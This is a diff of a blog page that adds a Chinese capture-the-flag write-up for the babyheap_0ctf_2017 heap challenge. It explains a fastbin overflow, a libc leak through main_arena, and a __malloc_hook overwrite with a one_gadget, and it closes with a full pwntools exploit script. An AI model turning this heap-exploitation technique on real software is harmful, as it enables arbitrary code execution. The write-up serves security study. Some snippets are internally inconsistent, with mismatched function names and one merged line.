@@ -120,7 +120,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    224 字
+                    1.1k 字
                   </span>&nbsp;
                 
 
@@ -128,7 +128,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      1 分钟
+                      5 分钟
                   </span>&nbsp;
                 
 
@@ -161,7 +161,8 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200129165539077.png" srcset="undefined" alt="image-20200129165539077"></p>
+            <h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>参考wp:<a href="https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2</a></p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200129165539077.png" srcset="undefined" alt="image-20200129165539077"></p>
 <pre><code>===== Baby Heap in 2017 =====
 1. Allocate
 
@@ -200,19 +201,19 @@ Index: 0
 <p>都设置为了0，这样就不能<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">Use_after_free</a></p>
 <p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200129172250382.png" srcset="undefined" alt="image-20200129172250382"></p>
 <p>先写好必须的四个功能</p>
-<pre><code class="python">    def add(size):
+<pre><code class="python">    def allocate(size):
         sh.sendlineafter(&quot;Command:&quot;,&quot;1&quot;)
         sh.sendlineafter(&quot;Size:&quot;,str(size))
         sleep(0.1)
 
-    def edit(Index,payload):
+    def fill(Index,payload):
         sh.sendlineafter(&quot;Command:&quot;,&quot;2&quot;)
         sh.sendlineafter(&quot;Index:&quot;,str(Index))
         sh.sendlineafter(&quot;Size:&quot;,str(len(payload)))
         sh.sendlineafter(&quot;Content:&quot;,str(payload))
         sleep(0.1)
 
-    def delete(Index):
+    def free(Index):
         sh.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)
         sh.sendlineafter(&quot;Index:&quot;,str(Index))
         sleep(0.1)
@@ -223,14 +224,159 @@ Index: 0
         sleep(0.1)
 </code></pre>
 <p>然后，先</p>
-<pre><code class="python">add(0x10)
-add(0x10)
-add(0x10)
-add(0x10)
-add(0x80)
+<pre><code class="python">add(0x10)     #0 0x00
+add(0x10)    #1 0x20
+add(0x10)    #2 0x40
+add(0x80)    #3 0x60
 gdb.attach(sh)
 heap</code></pre>
-<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200130203030683.png" srcset="undefined" alt="image-20200130203030683"></p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202114445460.png" srcset="undefined" alt="image-20200202114445460"></p>
+<pre><code class="python">free(2)    #0x40
+free(1)    #0x20</code></pre>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202114934969.png" srcset="undefined" alt="image-20200202114934969"></p>
+<p>然后，我们通过</p>
+<pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    
+fill(0,payload)    #0x00</code></pre>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202115823555.png" srcset="undefined" alt="image-20200202115823555"></p>
+<p>在这里我们可以看见，由于没有限制输入长度，我们可以写入fd 8个a，bk 8个a， fd_nextsize p64(0)，bk_nextsize p64(0x21)，然后写入到下一块 我们本来已经free掉了的<code>0x20</code>中的 fd中，使他的指向 <code>0x60</code>的bin，这样我们看fastbins时就只能看见<code>0x20</code>和<code>0x60</code>了</p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202121553155.png" srcset="undefined" alt="image-20200202121553155"></p>
+<pre><code class="python">allocate(0x10)    #1 0x20</code></pre>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202122603540.png" srcset="undefined" alt="image-20200202122603540"></p>
+<p>这样之后，我们的目的就达成了，把一块没有free的空间放入了fastbins中</p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202122724203.png" srcset="undefined" alt="image-20200202122724203"></p>
+<pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)
+fill(1,payload) </code></pre>
+<p>紧接着，我们把<code>0x40</code>的bk_nextsize 设为0x21,这样可以修改<code>0x60</code>的bin size为0x21(0x10 + 0x11)，绕过fastbin在分配内存的时候的检测</p>
+<blockquote>
+<p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p>
+</blockquote>
+<p>再次<code>allocate(0x10)  #2 0x60</code>就会把之前的0x80的块分配出来</p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202124220989.png" srcset="undefined" alt="image-20200202124220989"></p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202123933115.png" srcset="undefined" alt="image-20200202123933115"></p>
+<p>然后</p>
+<pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)
+fill(1,payload)  #1 0x20 还原#3的bin的size</code></pre>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202124141267.png" srcset="undefined" alt="image-20200202124141267"></p>
+<pre><code class="python">allocate(0x80)    #4        #为了让#3的bin不再挨着top chunk</code></pre>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202132442146.png" srcset="undefined" alt="image-20200202132442146"></p>
+<p>然后我们将<code>0x60    #3</code>free掉之后</p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202132625185.png" srcset="undefined" alt="image-20200202132625185"></p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202181236041.png" srcset="undefined" alt="image-20200202181236041"></p>
+<p>这样fd 和bk 都指向main_arena+88处</p>
+<p>==然后为啥dump2呢-。-==</p>
+<pre><code class="python">io.recvuntil(&#39;Content: \n&#39;)
+main_arena = u64(io.recv(6).ljust(8,&#39;\x00&#39;))-88
+log.success(&#39;main arena: &#39;+hex(main_arena))
+libc_base = main_arena - 0x3c4b20 
+log.success(&#39;libc base: &#39;+hex(libc_base))</code></pre>
+<p>0x3c4b20 可以在对应的libc中，搜索malloc_trim函数，可以在下图的地方看见</p>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202182025461.png" srcset="undefined" alt="image-20200202182025461"></p>
+<p>也可以使用<a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">main_arena_offset</a> <code>main_arena libcaddr</code>获取</p>
+<p>Arbitrary Alloc的例行公事，最终修改malloc_hook的内容为one_gadget</p>
+<pre><code class="python">one_gadget = libc_base + 0x4526a 
+allocate(0x60)    #3        
+free(3)                    
+fake_chunk_addr = main_arena - 0x33        
+payload = p64(fake_chunk_addr)
+fill(2,payload)
+</code></pre>
+<p>0x33</p>
+<blockquote>
+<p><code>p &amp;main_arena</code></p>
+<p><code>$1 = (struct malloc_state *) 0x7f5081821b20 &lt;main_arena&gt;</code></p>
+<p><code>x/10gx main_arena_addr-0x10</code></p>
+<p><code>0x7f5081821b10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x0000000000000000
+0x7f5081821b20 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000000000
+0x7f5081821b30 &lt;main_arena+16&gt;:    0x0000000000000000    0x0000000000000000
+0x7f5081821b40 &lt;main_arena+32&gt;:    0x0000000000000000    0x0000000000000000
+0x7f5081821b50 &lt;main_arena+48&gt;:    0x0000000000000000    0x0000000000000000</code></p>
+<p><code>find_fake_fast __malloc_hook_addr 0x70</code></p>
+<p><code>FAKE CHUNKS
+0x7f5081821aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
+ prev_size = 5801060741742067712, 
+ size = 127, 
+ fd = 0x50814e2e20000000, 
+ bk = 0x50814e2a0000007f, 
+ fd_nextsize = 0x7f, 
+ bk_nextsize = 0x0
+}</code></p>
+<p>计算偏移</p>
+<p><code>p/x main_arena_addr - fake_chunks_addr</code></p>
+</blockquote>
+<p><img src="/2020/01/31/babyheap_0ctf_2017/image-20200202193142303.png" srcset="undefined" alt="image-20200202193142303"></p>
+<pre><code class="python">allocate(0x60)    #3
+allocate(0x60)    #5
+payload = &#39;a&#39;*0x13+p64(one_gadget)
+fill(5,payload)
+allocate(0x10)
+sh.interactive()</code></pre>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre><code class="python">from pwn import *
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+context.log_level = &#39;debug&#39;
+sh = process(&#39;./babyheap_0ctf_2017&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+def allocate(size):
+    sh.recvuntil(&#39;Command: &#39;)
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Size: &#39;)
+    sh.sendline(str(size))
+
+def fill(idx,content):
+    sh.recvuntil(&#39;Command: &#39;)
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;Index: &#39;)
+    sh.sendline(str(idx))
+    sh.recvuntil(&#39;Size: &#39;)
+    sh.sendline(str(len(content)))
+    sh.recvuntil(&#39;Content: &#39;)
+    sh.sendline(content)
+
+def free(idx):
+    sh.recvuntil(&#39;Command: &#39;)
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;Index: &#39;)
+    sh.sendline(str(idx))
+
+def dump(idx):
+    sh.recvuntil(&#39;Command: &#39;)
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&#39;Index: &#39;)
+    sh.sendline(str(idx))
+
+
+allocate(0x10)    #0    0x00
+allocate(0x10)    #1    0x20
+allocate(0x10)    #2    0x40
+allocate(0x80)    #3    0x60
+free(2)
+free(1)
+payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    fill(0,payload)
+allocate(0x10)    #1
+payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)
+fill(1,payload)            
+allocate(0x10)    #2        
+payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)
+fill(1,payload)        
+allocate(0x80)    #4        
+free(3)                    
+dump(2)
+sh.recvuntil(&#39;Content: \n&#39;)
+main_arena = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88
+log.success(&#39;main arena: &#39;+hex(main_arena))
+libc_base = main_arena - 0x3c4b20
+log.success(&#39;libc base: &#39;+hex(libc_base))
+one_gadget = libc_base + 0x4526a # 0x4526a 0xf02a4 0xf1147 0x45216
+allocate(0x60)    #3        
+free(3)                    
+fake_chunk_addr = main_arena - 0x33        
+payload = p64(fake_chunk_addr)
+fill(2,payload)
+allocate(0x60)    #3
+allocate(0x60)    #5
+payload = &#39;a&#39;*0x13+p64(one_gadget)
+fill(5,payload)
+allocate(0x10)
+sh.interactive()</code></pre>
 
             <hr>
           </div>
